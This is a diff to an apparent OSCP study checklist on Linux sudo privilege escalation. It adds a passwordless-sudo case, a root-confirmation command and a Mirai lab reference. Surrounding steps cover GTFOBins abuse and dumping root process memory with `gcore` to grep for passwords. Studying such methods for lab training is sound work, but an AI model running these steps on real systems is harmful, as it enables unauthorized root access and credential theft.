@@ -8,7 +8,7 @@
 
 > **Why:** This asks sudo which commands the current account may run and whether a password is required, exposing the exact privilege boundary to test.
 ```bash
-sudo -l
+sudo -n -l
 ```
 
 ## Example output
@@ -24,9 +24,16 @@ Full sudo:
 User username may run the following commands on host:
     (ALL : ALL) ALL
 ```
+
+Unrestricted passwordless sudo:
+```
+User username may run the following commands on host:
+    (ALL) NOPASSWD: ALL
+```
 ## What did you get?
 
 - [ ] `(ALL) ALL` is shown → **Run `sudo su`, run `id` to confirm UID 0, then go to Step 21 · [[Linux - Clean Down]]**
+- [ ] `(ALL) NOPASSWD: ALL` is shown → **Run `sudo -n sh -c 'id; whoami; hostname'`, confirm UID 0, then go to Step 21 · [[Linux - Clean Down]]**
 - [ ] A specific NOPASSWD binary is shown → **Open the matching GTFOBins entry, copy its SUID or sudo command, run it once, and return here with the resulting identity**
 - [ ] A NOPASSWD script path is shown but the file is absent → **Run `ls -la $SudoScriptDir`; if the parent path is writable, run `mkdir -p $SudoScriptDir` and create the approved script, then rerun the exact sudo path**
 - [ ] `NOPASSWD: /usr/bin/gcore` is shown → **Run `ps aux | grep root`, set `$Pid` to the target process ID, run `sudo gcore $Pid`, then run `strings core.$Pid | grep -A2 -i "password"`**
@@ -209,6 +216,7 @@ sudo /bin/nano $SudoFile
 - [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- argument-specific `journalctl` permission opened a pager and a root shell
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- passwordless sudo to Luvit enabled Lua `os.execute()` as another user
 - [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- passwordless sudo to Chef Knife enabled Ruby `exec` and a root shell
+- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- `pi` had unrestricted `NOPASSWD: ALL`, so a direct sudo identity proof completed escalation
 
 ## Chef Knife Ruby evaluation
 
